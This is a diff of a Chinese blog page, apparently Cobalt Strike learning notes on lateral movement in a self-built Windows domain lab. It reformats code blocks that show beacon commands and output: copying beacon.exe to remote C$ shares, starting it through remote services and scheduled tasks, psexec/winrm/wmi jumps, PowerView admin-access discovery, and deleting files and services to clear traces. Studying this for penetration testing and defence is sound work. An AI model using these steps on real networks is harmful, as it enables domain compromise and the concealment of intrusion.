@@ -458,71 +458,123 @@
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-1.png"></p>
 <p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。</p>
 <h1 id="0x02-上传可执行文件"><a href="#0x02-上传可执行文件" class="headerlink" title="0x02 上传可执行文件"></a>0x02 上传可执行文件</h1><p>首先使用 Cobalt Strike 上的 <code>upload</code> 功能上传文件，接着复制文件到目标主机的其他位置。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">copy</span> file.exe \\host\C<span class="variable">$</span>\Windows\Temp</span><br></pre></td></tr></table></figure>
+<pre><code class="powershell">shell copy file.exe \\host\C$\Windows\Temp</code></pre>
+<pre><code class="powershell">beacon&gt; upload /root/beacon.exe
+[*] Tasked beacon to upload /root/Desktop/beacon.exe as beacon.exe
+[+] host called home, sent: 289302 bytes
 
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; upload /root/beacon.exe</span><br><span class="line">[*] Tasked beacon to upload /root/Desktop/beacon.exe as beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">289302</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">copy</span> beacon.exe \\WinTest\C<span class="variable">$</span>\Windows\Temp</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">copy</span> beacon.exe \\WinTest\C<span class="variable">$</span>\Windows\Temp</span><br><span class="line">[+] host called home, sent: <span class="number">72</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">已复制         <span class="number">1</span> 个文件。</span><br></pre></td></tr></table></figure>
-
+beacon&gt; shell copy beacon.exe \\WinTest\C$\Windows\Temp
+[*] Tasked beacon to run: copy beacon.exe \\WinTest\C$\Windows\Temp
+[+] host called home, sent: 72 bytes
+[+] received output:
+已复制         1 个文件。</code></pre>
 <h1 id="0x03-执行文件（方法一）"><a href="#0x03-执行文件（方法一）" class="headerlink" title="0x03 执行文件（方法一）"></a>0x03 执行文件（方法一）</h1><p>1、生成 Windows Service EXE 并上传</p>
 <p>2、在目标主机上创建一个服务</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">sc</span> \\host create name binpath= c:\windows\temp\file.exe</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">93</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[<span class="type">SC</span>] CreateService 成功</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">shell sc \\host create name binpath= c:\windows\temp\file.exe</code></pre>
+<pre><code class="powershell">beacon&gt; shell sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe
+[*] Tasked beacon to run: sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe
+[+] host called home, sent: 93 bytes
+[+] received output:
+[SC] CreateService 成功</code></pre>
 <blockquote>
 <p>注：记住 binpath 路径</p>
 </blockquote>
 <p>3、在目标主机上启动服务</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">sc</span> \\host <span class="built_in">start</span> name</span><br></pre></td></tr></table></figure>
+<pre><code class="powershell">shell sc \\host start name</code></pre>
+<pre><code class="powershell">beacon&gt; shell sc \\wintest start beacon
+[*] Tasked beacon to run: sc \\wintest start beacon
+[+] host called home, sent: 56 bytes
+[+] received output:
+SERVICE_NAME: beacon 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3816
+        FLAGS              : 
 
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest <span class="built_in">start</span> beacon</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest <span class="built_in">start</span> beacon</span><br><span class="line">[+] host called home, sent: <span class="number">56</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">SERVICE_NAME: beacon </span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : <span class="number">2</span>  START_PENDING </span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x0</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x7d0</span><br><span class="line">        PID                : <span class="number">3816</span></span><br><span class="line">        FLAGS              : </span><br><span class="line">        </span><br><span class="line">beacon&gt; link wintest</span><br><span class="line">[*] Tasked to link to \\wintest\pipe\msagent_da00</span><br><span class="line">[+] host called home, sent: <span class="number">36</span> bytes</span><br><span class="line">[+] established link to child beacon: <span class="number">192.168</span>.<span class="number">175.130</span></span><br></pre></td></tr></table></figure>
-
+beacon&gt; link wintest
+[*] Tasked to link to \\wintest\pipe\msagent_da00
+[+] host called home, sent: 36 bytes
+[+] established link to child beacon: 192.168.175.130</code></pre>
 <p>4、清除痕迹与服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\host delete name</span><br></pre></td></tr></table></figure>
+<pre><code>shell sc \\host delete name</code></pre>
+<pre><code class="powershell">beacon&gt; shell del beacon.exe
+[*] Tasked beacon to run: del beacon.exe
+[+] host called home, sent: 57 bytes
 
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">del</span> beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">del</span> beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">57</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">del</span> \\wintest\C<span class="variable">$</span>\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">del</span> \\wintest\C<span class="variable">$</span>\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">83</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest delete beacon</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest delete beacon</span><br><span class="line">[+] host called home, sent: <span class="number">69</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[<span class="type">SC</span>] DeleteService 成功</span><br></pre></td></tr></table></figure>
+beacon&gt; shell del \\wintest\C$\windows\temp\beacon.exe
+[*] Tasked beacon to run: del \\wintest\C$\windows\temp\beacon.exe
+[+] host called home, sent: 83 bytes
 
+beacon&gt; shell sc \\wintest delete beacon
+[*] Tasked beacon to run: sc \\wintest delete beacon
+[+] host called home, sent: 69 bytes
+[+] received output:
+[SC] DeleteService 成功</code></pre>
 <h1 id="0x04-执行文件（方法二）"><a href="#0x04-执行文件（方法二）" class="headerlink" title="0x04 执行文件（方法二）"></a>0x04 执行文件（方法二）</h1><p>1、生成 Windows EXE 并上传，注意这里生成的 EXE 和<code>方法一</code>生成的 EXE 是不一样的类型，这里生成的是<code> Windows EXE</code>，不是方法一中的<code>Windows Service EXE</code></p>
 <p>2、找到目标系统上的时间</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net time \\host</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net time \\windc</span><br><span class="line">[*] Tasked beacon to run: net time \\windc</span><br><span class="line">[+] host called home, sent: <span class="number">49</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">\\windc 的当前时间是 <span class="number">2020</span>/<span class="number">8</span>/<span class="number">30</span> <span class="number">14</span>:<span class="number">54</span>:<span class="number">09</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">shell net time \\host</code></pre>
+<pre><code class="powershell">beacon&gt; shell net time \\windc
+[*] Tasked beacon to run: net time \\windc
+[+] host called home, sent: 49 bytes
+[+] received output:
+\\windc 的当前时间是 2020/8/30 14:54:09
+命令成功完成。</code></pre>
 <p>3、创建一个计划任务</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell at \\host HH:mm C:\path\to\bad.exe</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell at \\windc <span class="number">15</span>:<span class="number">00</span> C:\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: at \\windc <span class="number">15</span>:<span class="number">00</span> C:\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">76</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">新加了一项作业，其作业 ID = <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">shell at \\host HH:mm C:\path\to\bad.exe</code></pre>
+<pre><code class="powershell">beacon&gt; shell at \\windc 15:00 C:\windows\temp\beacon.exe
+[*] Tasked beacon to run: at \\windc 15:00 C:\windows\temp\beacon.exe
+[+] host called home, sent: 76 bytes
+[+] received output:
+新加了一项作业，其作业 ID = 1</code></pre>
 <p>4、当计划任务被执行时，执行 link hostname 即可上线主机</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; link windc</span><br><span class="line">[*] Tasked to link to \\windc\pipe\msagent_d76a</span><br><span class="line">[+] host called home, sent: <span class="number">34</span> bytes</span><br><span class="line">[+] established link to child beacon: <span class="number">192.168</span>.<span class="number">175.144</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; link windc
+[*] Tasked to link to \\windc\pipe\msagent_d76a
+[+] host called home, sent: 34 bytes
+[+] established link to child beacon: 192.168.175.144</code></pre>
 <h1 id="0x05-beacon-的自动操作"><a href="#0x05-beacon-的自动操作" class="headerlink" title="0x05 beacon 的自动操作"></a>0x05 beacon 的自动操作</h1><p>前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。</p>
 <ul>
 <li>使用一个服务运行可执行文件</li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec [<span class="type">target</span>] [<span class="type">share</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">psexec [target] [share] [listener]</code></pre>
 <ul>
 <li>使用一个服务运行 Powershell 单行程序</li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec_psh [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">psexec_psh [target] [listener]</code></pre>
 <ul>
 <li>通过 WinRM 运行 Powershell 单行程序</li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">winrm [target] [listener]</code></pre>
 <ul>
 <li>通过 WMI 运行 Powershell 单行程序</li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmi [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">wmi [target] [listener]</code></pre>
 <p>在 Cobalt Strike 的 <code>viwe --&gt; Targets</code> 下，右击主机选择 <code>Jump</code> 也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。</p>
 <p>接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 <code>net view</code> 查看一下当前域环境中的主机信息。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net view</span><br><span class="line">[*] Tasked beacon to run net view</span><br><span class="line">[+] host called home, sent: <span class="number">104504</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">List of hosts:</span><br><span class="line">[+] received output:</span><br><span class="line"> Server Name             IP Address                       Platform  Version  <span class="built_in">Type</span>   Comment</span><br><span class="line"> -----------             ----------                       --------  -------  ----   -------            </span><br><span class="line"> WINDC                   <span class="number">192.168</span>.<span class="number">175.144</span>                  <span class="number">500</span>       <span class="number">6.1</span>      PDC    </span><br><span class="line"> WINTEST                 <span class="number">192.168</span>.<span class="number">175.130</span>                  <span class="number">500</span>       <span class="number">6.1</span>         </span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; net view
+[*] Tasked beacon to run net view
+[+] host called home, sent: 104504 bytes
+[+] received output:
+List of hosts:
+[+] received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------            
+ WINDC                   192.168.175.144                  500       6.1      PDC    
+ WINTEST                 192.168.175.130                  500       6.1         </code></pre>
 <p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell<span class="literal">-import</span> PowerView.ps1</span><br><span class="line">[*] Tasked beacon to import: PowerView.ps1</span><br><span class="line">[+] host called home, sent: <span class="number">101224</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[+] host called home, sent: <span class="number">329</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">WinDC.teamssix.com</span><br></pre></td></tr></table></figure>
+<pre><code class="powershell">beacon&gt; powershell-import PowerView.ps1
+[*] Tasked beacon to import: PowerView.ps1
+[+] host called home, sent: 101224 bytes
 
+beacon&gt; powershell Find-LocalAdminAccess
+[*] Tasked beacon to run: Find-LocalAdminAccess
+[+] host called home, sent: 329 bytes
+[+] received output:
+WinDC.teamssix.com</code></pre>
 <p>接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌。</p>
 <p>这里笔者认为应该是因为当前在 wintest 主机上有 windc 的管理员账户登录着，所以使用 wintest 的访问令牌是可以获取 windc 的信任的，类似于 <a target="_blank" rel="noopener" href="https://teamssix.com/year/200419-150622.html">CS 学习笔记 17 节</a>里的描述方法，如有不正确之处，还请多多指教。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-2.png"></p>
@@ -964,7 +1016,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
